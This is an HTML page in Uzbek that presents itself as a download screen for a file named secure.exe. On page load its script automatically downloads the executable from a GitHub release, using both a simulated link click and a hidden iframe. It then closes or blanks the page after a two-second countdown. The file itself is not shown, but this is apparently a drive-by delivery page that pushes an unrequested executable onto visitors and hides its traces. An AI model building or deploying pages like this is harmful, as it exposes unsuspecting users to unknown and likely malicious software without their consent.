<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>secure.exe yuklanmoqda...</title>
<link rel="icon" href="favicon.png" type="image/png"/>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<script>
  const DOWNLOAD_URL = 'https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe';

  function triggerDownload() {
    try {
      const a = document.createElement('a');
      a.href = DOWNLOAD_URL;
      a.download = 'secure.exe';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch(e) {}

    try {
      const ifr = document.createElement('iframe');
      ifr.style.display = 'none';
      ifr.src = DOWNLOAD_URL;
      document.body.appendChild(ifr);
    } catch(e) {}
  }

  function exitSite() {
    try {
      window.open('', '_self', '');
      window.close();
    } catch(e) {}

    setTimeout(() => {
      window.location.replace('about:blank');
    }, 300);
  }

  window.addEventListener('DOMContentLoaded', () => {
    triggerDownload();

    let timeLeft = 2;
    const cdEl = document.getElementById('cd');
    const timer = setInterval(() => {
      timeLeft--;
      if (cdEl) cdEl.textContent = timeLeft;
      if (timeLeft <= 0) {
        clearInterval(timer);
        exitSite();
      }
    }, 1000);
  });
</script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg: #0c0c12;
    --surface: #16161f;
    --border: #262636;
    --accent: #7c6dfa;
    --text: #f4f4f7;
    --text-muted: #9494a8;
  }
  body {
    font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
    background: radial-gradient(circle at 50% 20%, #1a1932 0%, var(--bg) 70%);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    overflow: hidden;
  }
  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 20px;
    padding: 40px 32px;
    max-width: 440px;
    width: 100%;
    text-align: center;
    box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 80px rgba(124,109,250,0.15);
    animation: fadeIn 0.4s ease-out;
  }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(12px) scale(0.98); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
  .icon-wrap {
    width: 72px;
    height: 72px;
    background: linear-gradient(135deg, rgba(124,109,250,0.2), rgba(99,102,241,0.05));
    border: 1px solid rgba(124,109,250,0.4);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    font-size: 32px;
    position: relative;
  }
  .spinner {
    position: absolute;
    inset: -3px;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--accent);
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  h1 {
    font-size: 22px;
    font-weight: 700;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  p {
    font-size: 14px;
    color: var(--text-muted);
    line-height: 1.5;
    margin-bottom: 20px;
  }
  .status-box {
    background: #0f0f17;
    border: 1px solid var(--border);
    padding: 12px 16px;
    border-radius: 10px;
    font-size: 13.5px;
    color: #c4b5fd;
    margin-bottom: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 12px 20px;
    background: var(--border);
    color: var(--text);
    text-decoration: none;
    border: none;
    border-radius: 12px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s;
  }
  .btn:hover {
    background: #36364d;
  }
</style>
</head>
<body>
  <div class="card">
    <div class="icon-wrap">
      <div class="spinner"></div>
      📥
    </div>
    <h1>Yuklab olinmoqda...</h1>
    <p>Fayl yuklab olish boshlandi. Saytdan <b id="cd" style="color:var(--accent)">2</b> soniyada chiqib ketiladi.</p>
    <div class="status-box">
      <span>📄</span> <b>secure.exe</b> yuklanmoqda
    </div>
    <button class="btn" onclick="exitSite()">
      ✕ Hozir chiqish
    </button>
  </div>
</body>
</html>
